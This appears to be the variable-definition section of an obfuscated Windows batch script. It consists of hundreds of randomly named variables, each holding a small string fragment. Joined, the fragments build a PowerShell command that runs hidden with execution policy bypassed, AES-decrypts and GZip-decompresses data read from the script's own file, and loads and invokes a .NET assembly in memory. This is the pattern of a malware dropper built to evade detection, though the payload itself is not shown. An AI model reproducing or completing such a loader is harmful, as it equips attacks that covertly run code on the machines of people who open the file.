ualBOGvshk=ws"
PxzdwcSExs= /"
ndjtYQuanY=po"
cHFmSnCqnE=Wi"
CJnGNBkyYp=co"
jaXcJXQMrV=rS"
nwIWiBzpbz=:\"
xprVJLooVF=Po"
tzMKflzfvX=0\"
VCWZpprcdE=1."
XzrrbwrpmM=\v"
BFTOQBPCju=st"
WmUoySsDby=he"
tHJYExMHlP=rs"
JPfTcZlwxJ=do"
VxroDYJQKR=y "
UBndSzFkbH=py"
KXASGLJNCX=ll"
vlwWETKcZH=em"
OOOxFGwzUd=e""
NCtxqhhPqI=32"
GOPdPuwuLd=\W"
XUpMhOyyHB=ex"
cIqyYRJWbQ=we"
kTEDvsZUvn=nd"
XBucLtReBQ=Sy"
JBRccySrUq=ow"
eNOycQnIZD=xe"
chXxviaBCr=we"
YcnfCLfyyS=in"
lYCdEGtlPA=.e"
pMrovuxjjq=he"
UrPeBlCopW=ll"
ujJtlzSIGW= C"
zhNAugCrcK="%~0."
ZqjBENExAX=s\"
dzPrbmmccE=cd"
xQseEVnPet= "%~dp0""
wxzMwkmbmY=gDBN"
VavtsuhNIN=F'[-"
AHKCuBAkui=r = "
ARecVABHyu=uZOc"
AbZpTpKurz=6] -"
BaMYsIgnsM=$uZO"
JBUgbyTPxp=m(, "
vGOYQQYIpx=.-16"
yPzFwnsYdA= New"
zuIYfGJIhV=O.Me"
gbXeIdPSoj='[-1"
BqEMjgsfHM=]::("
bivuMABwCB=Invo"
SJsEzuInUY=ile "
htJeDhbeDW=();$"
ZygfZJxAOd=acUA"
eDhTebXJLa="%~nx0."
YlKbYsFYPy=in $"
jdKMRqipbM=e]::"
GVIREkvxRa=();$"
OckpqzbYcn=n ''"
UPfjubfNXt=Mr, "
AkaPyEXHFq=esMa"
LODxmGMGqq=flec"
hImzprlFyw=pose"
VZAbZqJHBk=1] -"
WYJXnBQBDj= [Sy"
rSVBNvbdPT=stem"
tVtxVGNpFB=vert"
tHHIjVCHeH=::De"
WvjMoIIiUn=);$b"
vmIEtsktnA=ypto"
AbMyvUGzSH=fore"
zDUDeXKPaV=..-1"
INPLAzQfUo== [S"
ArAxZuPIrp== $B"
nGqMpclaJV=ZOcm"
lfYSggLrsL=null"
eQPFkQsLmh=hy.A"
AyyrPvjwjr=;$mN"
rjhOhltPzI=Disp"
WojQSFImBz=17js"
SKEwAQBRlN=$Nlg"
KytxcYPZKt=YiLG"
RGlZIMTaRM=urit"
igJmqZApvQ=ss -"
dGSGnKbkQW=pose"
lSUnvlNyZI=tem."
rddZbDFvhl=)))"
KHqiJghRbq=and "
WPGlloqWfh=ddin"
pLUeCEDcNj=]::C"
drymkVAnZW=);$B"
KdByPVjCnF=ring"
VnDoNvCbDL=orF'"
GapFScCcpe=ke($"
iVrCyJhMiJ=fc6t"
oMsMdPYmPd=ert]"
odWdfvJnBE=Lk ="
ekEoGMuERC=yste"
QMmDXFyyag=Syst"
cYinxarhDL=lit("
bIgeRgvTeJ=ap.T"
acXjUrxrpX=raph"
SCbDgQuqTU=ay()"
YYKSCuCbgJ=New-"
YnGvhgYxvb=cm ="
vnHosfjdeN=;$Pt"
LIQYgFxctD=d;$B"
olHsTHINJO=[Env"
WQqetkePWs=NVPb"
AGOCIKFMEK=::('"
QbKdEZdxpx=uGcO"
RWcegafVtf=daeR"
ESpdErsKEO=pher"
kJjQuXIjOT=.Con"
dbDMRBPrxg=uGcO"
mBIWiJNHWZ=esaB"
WmHvayPxwd=.Mem"
oQYrpYRHsU=stem"
HFLAqJuuyu=ew-O"
JhYYmEHfJT=ing("
pTKKchMUFD=BC;$"
vShQyqnqqU=exe""
PjdRUyhsyG=[]] "
VUeZKgDBUe=.Com"
oNvGdyNkLt=oArr"
IAkZpnEseT=UA.I"
haSZYOmkiA=bstr"
tzSNMWchGN=]::N"
YKwLsVwqOj=Fina"
MFRjJyYsrs=k; }"
EdLUuXiTNo=File"
nMbUuONTOk=7;$B"
OAsjgKHKoH= = N"
LLNnWnTLBJ=$bTM"
xVIsxobyZi= '')"
pUKFMEPFQs=onve"
DDiJEpaiME=acUA"
ENADhKPHot= [st"
WTAeYdswqF=.IO."
hVncqdtHrj=[Sys"
EUwICZcugV=);$N"
USLedfRsdA=ispo"
YULKJDZpgz=t Sy"
BlIFABuPAW=ress"
gNabAkLFGN=();$"
cGJiVEdEzp=ZOcm"
OpWuyrggtP=ddin"
NbOjNijxuU=.Len"
EuMCNHEVeC=nirt"
iHRclHpeVX=-joi"
zFvgtBzUer=Comp"
klVPUdMJas=ecry"
tBsRPAyhtG=;$gD"
uOGlqENvnk=$NVP"
WSRbQhwrOC=$eIf"
gFQQimTbzp=bjec"
FCBcNynRGD=Bmor"
gNELMMjyFY=-win"
pqWXTkasXe=+M0z"
pjrIjvjdGR=tryP"
aGQeJYSFDZ=m.Re"
hknFiXCnZQ=ion."
MxwsyqmvYm=.Cre"
FijcPoQLnC=ne);"
VGKsxiJBaT=.Sec"
roXhULjavE=pres"
FraARuTjiq=($Yi"
rEvTlCThdH=VIHX"
JCuNlxqlBZ=:: '"
BANrSlObpx=nage"
CMHWMmXlZO=eam("
MtoMzhoqyY=bypa"
xfHbUEWpFC=-Obj"
ktDjVGpvOa=pStr"
hzjnwzdyGY=ct S"
HkiSTlwlIs=-4] "
AnKEeEZdOq=rans"
doKcadyJqy=xU7e"
dyJHMHMcNc=S46e"
jCsFOJQsdv=tem."
pEeOvclMbZ=PKCS"
fFqNPWfBWr=se()"
XEyDmChJvW= = $"
ZMNBNnhYdl=BacU"
UmCJMMMcBg=m.IO"
FcrKUOEnOU=.Cop"
eYuashSMjP=y.Ci"
reviZiSttH=oryS"
xijYXotZPT=Comp"
yqhJQSZuJo=rAsa"
QCZuMFaZsV=lBlo"
DAaZVQYtML=V = "
gbVsRGzTij=.Key"
OOiwgwuupI=ose("
hbFnQgCXwX=Secu"
AiqHTcPzsv=th('"
KUKwZheGNw=BNO "
OonlMOpxYC=tem."
oFspIELDJK=ewLi"
isQISZiBPJ=acUA"
EiWocIreAk=yTo("
CZpuCIcrKh=Secu"
ZNBNkxQuUl=.GZi"
ZPlPiozEyW='')("
eFWpiweoyr=am;$"
kEHDlJOIVc=gMod"
PwJJFMgamh=eHDU"
nfEeCcWKKK=-ep "
dAuevoJWoL=gnir"
BMVjGSkNrk=.Cry"
GwAFOSfUtV=acUA"
bSIafzAxiZ=Lk.T"
uynFENuiYB=iron"
BGoTReCegg=qq ="
DXdgqiFTAH=ptog"
QNxYaFZSBu=);$P"
shhyfkrTvn=m = "
fvEtritbuM= = $"
IwOqmlYsbl=('da"
EDuGpmwedn=m = "
rFsKCxpAbv=.Dis"
HLynrUfwGo=6esa"
wwmTmFdRsZ=trea"
IeRiYUFnCZ=Obje"
kxCYxBSxVM=..-1"
xULgeMdzcg='0xd"
vXewtPjogB=$bTM"
GhTXhmRnCR=, (,"
MBvrUwPCDz=m.IO"
KVdpASYkBZ=A.Pa"
fxpyemHAMo=Stre"
KtmeCApwQn=tion"
jWtWLzuDKP=bbqM"
xllGdjvUjB=em.I"
ahbOZSBViB=Star"
MusMeoeDey=Disp"
ySgQyAAfQH=ect "
LPGeAanVGt=3); "
LYxpWUVnyn==');"
TfyrgNGxBL=ress"
ZNnASGtLCj=y]::"
KXttaDcyMZ=.Mod"
RfMwENsorP=morF"
CZTFliIBbC=:('g"
mYyPXMYwYi=oint"
SIQjFslpHA=comm"
pibEdoDBbD=mNKM"
TVsNOuCNZd= '')"
yQujDHraSv= hid"
fVHBRsLNUl='gni"
iREuYMPcTg=ct S"
uDsfTCYsro=g = "
zwDBykiqZZ=den "
weRTbbZPjT=tyle"
uwRWnyAikF=tS46"
bTHJpHTPMM=)($V"
TuqTvTpeOG=bn.D"
GWrDWSvoPL=W.Su"
KXapePmHCe=form"
eeacPrYshd=iW20"
XEcuUpquLQ=ress"
iCcGUuJxVn=.Dis"
WXWHLOygSe=gap."
XIAbFAgCIP=dows"
QzqEkBCLON=Lk);"
pCjFJxRqgH=Conv"
TEtLFfgLmA=TMLk"
GzBAHPVuTq=] -j"
VUsEoebHks=('2h"
YiVTQhqRnm=New-"
kQQvXhxXIT=Mode"
RITIeDNkWx=$mNK"
LNwemqbftD=saBm"
DCnzMxKRnm=ose("
ftaecaUnft=;$Nl"
KhyyrSrcKr='[-1"
QpDqsQAemY=rt]:"
RycUceHQZc=ck($"
QTBYjmNXEB=[Sys"
iKAAuWsbec=).Sp"
UAnQUvXBfs=$bTM"
zhsTKtujLg=acUA"
CpAQgSdzaC=Syst"
qIhOqqdyjR=uZOc"
LmCknrHfoB=ach "
dlzhxQnMss=TBkD"
YJZmDySMUy=)($u"
gqUdnmSTUN=LGW "
tuAPcYGhzl=n/J7"
jxjvtHoTnR=tfdQ"
jpqWVBsCpx=;$Nl"
HUAAetwukX=1..-"
rVOFKTskYR=]::("
XzWakcViZI=ptor"
hNwOTmvEJo=gGVE"
MFpVhvZMMs=ptog"
YRqcyngfyU=$Bac"
uIWSZVpUHl=sion"
QGiWXkfFPy=);$B"
JPOdGPAwht=/Ntk"
mxXhSCdBil=KMr."
TYbHmXrqgV=)) {"
kpEWZrtOzX=; };"
TypmIIEYJC=grap"
GEFNspgkfU=Obje"
glRvzlEEoe=join"
JbFOJyRrBm=oL'["
hwZKiiLqAE=LGW."
MrNTGKcbYu=n ''"
XClTzcVMGM=join"
XqtgTmRIdO=em.C"
nMLIkcyFZj='txe"
BrDOtQoojB=$uZO"
LfngwmfRCb=fdQ."
jtkYEPXtKX=TllA"
KAlyOryibJ=yste"
GJcpQprPXv=ionM"
rofQqYizRu=-joi"
UFSmCjquVd=rity"
SRYmoDJgcF=raph"
mFZJVdqlTD=[-1."
hbnAmGyJMk=gth)"
hTTJOKGuzo=brea"
JenYfqHzBk=y.Cr"
DwiWdAaOiv=cm);"
vPgKEvZmlQ===')"
jgiQdwyxFg=rtS4"
qpUykKHwzb=('%~f0'"
GLwLVWewUj=eIfq"
MAPkvbWKbC=.Ass"
jugDlMdkcG=.Cry"
TiuQnZmosP=-1.."
EQAuBusyXb=q) {"
GTgGJngEbX=[IO."
yZlAoExoOn=O.En"
sLNudRRtUX=  $V"
WauWfrgGak=ment"
YmUoUKWAtR=ode]"
yOkBDuSVrl= if "
MJKqSlzRdg=VPbn"
PmpGnAHBIo=, $u"
cUDojRpXKx= [Sy"
svwZUufvHX=y.Pa"
GDXqElqPYy=($Yi"
ybHVOwcPrc= = ["
hIpFAiXGDz=m, 0"
lfCLMrJHhW=gap "
NXvoEmTmgu=1Mwd"
DNNdkNfTiI=comp"
kpzxAxFvLw=('%*'"
MsfoqNTDfI=ateD"
MmhvJKSdep=mory"
uVLEiIUjzw=prof"
NvnNgHLBLJ=n7Lw"
owRVWPJqcX=rity"
HlBVDpGgba=embl"
SIneUaQPty=stem"
nogFGGEgdF=16] "
qsPTvcejTS=n = "
wEZCzuPukj=[Sys"
rVuFsOUxnm=yste"
fLycQgNMii=oin "
KsuJogdoiJ= -no"
djeIEnPaCg=tsWi"
brwOvSubJT=e = "
TOqZKQRZli=uZOc"
